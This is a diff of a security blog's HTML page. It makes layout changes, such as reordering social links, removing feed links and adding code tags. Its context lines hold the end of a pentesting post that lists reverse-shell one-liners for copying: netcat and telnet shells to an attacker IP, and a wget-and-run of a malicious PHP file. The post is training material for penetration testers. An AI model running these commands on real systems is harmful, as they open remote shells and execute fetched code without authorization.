@@ -6,7 +6,6 @@
         <meta name="author" content="Tim Tomes">
         <meta name="description" content="Articles, information, and projects related to development and web application security.">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <link rel="alternate" href="/atom.xml" title="Recent Articles" type="application/atom+xml">
         <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:400,300,600" type="text/css">
         <link rel="stylesheet" href="/static/css/normalize.css">
         <link rel="stylesheet" href="/static/css/skeleton.css">
@@ -22,11 +21,10 @@
                         <li><a href="/"><img src="https://www.gravatar.com/avatar/0a6d9b1ad59ad436bf9d9d16b2a7133e.png?s=128" class="avatar" /></a></li>
                                             <li><a href="https://bitbucket.org/lanmaster53" target="_blank"><img src="/static/images/meta/bitbucket.png" /></a></li>
                                             <li><a href="https://github.com/lanmaster53" target="_blank"><img src="/static/images/meta/github.png" /></a></li>
-                                            <li><a href="https://www.youtube.com/user/lanmaster53" target="_blank"><img src="/static/images/meta/youtube.png" /></a></li>
                                             <li><a href="https://twitter.com/lanmaster53" target="_blank"><img src="/static/images/meta/twitter.png" /></a></li>
                                             <li><a href="https://www.linkedin.com/in/lanmaster53" target="_blank"><img src="/static/images/meta/linkedin.png" /></a></li>
+                                            <li><a href="https://www.youtube.com/user/lanmaster53" target="_blank"><img src="/static/images/meta/youtube.png" /></a></li>
                                             <li><a href="/contact/"><img src="/static/images/meta/email.png"></a></li>
-                        <li><a href="/atom.xml"><img src="/static/images/meta/feed.png"></a></li>
                     </ul>
                 </div>
                 <div class="eight columns nav">
@@ -81,7 +79,7 @@
 <p><a href="/static/images/posts/sh_php.png"><img alt="" src="/static/images/posts/sh_php.png" /></a></p>
 <p>I want to end this post by stating that I am not the originator of techniques #1, 2, 3, 5, or 7. The majority of these techniques were learned in Ed Skoudis' amazing Security 504 and 560 classes available through SANS. Technique #4 is something I've never seen but stumbled across as I was conducting the demos for this post, so I'll take credit. Obviously, anyone can do #6, and there are plugins for various automated web app testing software packages that do, but I built my script from the ground up and tailored it to preference. If you know of any additional methods that may be helpful to the pentesting community, please leave in the comments below. Without sharing, we all fail. Thanks, and enjoy!</p>
 <p>For copy and paste:</p>
-<div class="codehilite"><pre><span></span><span class="c1">#1</span>
+<div class="codehilite"><pre><span></span><code><span class="c1">#1</span>
 nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash
 <span class="c1">#2</span>
 mknod backpipe p<span class="p">;</span> nc &lt;attacker_ip&gt; &lt;port&gt; <span class="m">0</span>&lt;backpipe <span class="p">|</span> /bin/bash <span class="m">1</span>&gt;backpipe
@@ -93,7 +91,7 @@ mknod backpipe p<span class="p">;</span> telnet &lt;attacker_ip&gt; &lt;port&gt;
 telnet &lt;attacker_ip&gt; &lt;1st_port&gt; <span class="p">|</span> /bin/bash <span class="p">|</span> telnet &lt;attacker_ip&gt; &lt;2nd_port&gt;
 <span class="c1">#7</span>
 wget -O /tmp/bd.php &lt;url_to_malicious_file&gt; <span class="o">&amp;&amp;</span> php -f /tmp/bd.php
-</pre></div>
+</code></pre></div>
 </div>
 <p>Like what you see? Join me for live training! See the <a href="/training/">Training</a> page for more information.</p>
 <hr>
